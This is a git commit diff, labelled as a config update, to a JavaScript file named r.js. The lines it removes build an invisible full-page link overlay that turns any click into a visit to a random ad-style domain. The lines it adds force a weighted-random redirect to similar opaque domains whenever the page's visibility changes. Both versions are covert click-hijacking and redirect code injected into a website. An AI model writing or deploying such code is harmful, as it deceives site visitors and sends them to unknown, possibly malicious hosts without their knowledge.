c2c0ce8f137194b24b1476bcd01d8af5f783eca7
John <John@qq.com>
2025-04-29 12:30:56 +0800

    update a5 config

--- a5/r.js
+++ a5/r.js
@@ -1,29 +1,22 @@
-function createLink() {
-  var urls = [
-    // hil: db (ss)
-    // "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
-    "https://tidy-status.com/bS3.VD0oPL3npkvjbEm/VuJfZ/Du0o1ZNJDaMV2jOMTJcy2/LpTsU/0-Mdz/Y/5vNrzRcY",
-    // hil: db-"https://www.qrcreate.online",
-    "https://tidy-status.com/BskeKo",
-    
+onPageVisibilityChange(async function() {
+  const links = [
+    {
+      urls: [
+        // hil: db (ss)
+        "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
+        "https://tidy-status.com/BskeKo",
+      ],
+      w: 3.0
+    },
     // mon: db
-    // "https://laichegloavy.com/4/7631332",
-    // "https://vorsoutseemt.com/4/7436813",
-    // "https://eedootefaug.net/4/7420698",
-    "https://futseerdoa.com/4/7237921",
-    "https://eeboazurg.net/4/7420696",
-    "https://psauwaun.com/4/7614690",
-    "https://ptougeegnep.net/4/7237907",
+    {
+      urls: [
+        "https://bulrovufaiphi.com/4/9242232",
+        "https://bulrovufaiphi.com/4/9242113",
+        "https://bulrovufaiphi.com/4/7420698",
+      ],
+      w: 1.0
+    }
   ];
-
-  if (urls.length === 0) {
-    return;
-  }
-  var a = document.createElement('a');
-  a.href = urls[Math.floor(Math.random() * urls.length)];
-  a.rel = 'noopener noreferrer';
-  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
-  document.body.appendChild(a);
-}
-
-document.addEventListener('DOMContentLoaded', createLink);
+  redirectSelectLinkByWeight(links);
+});
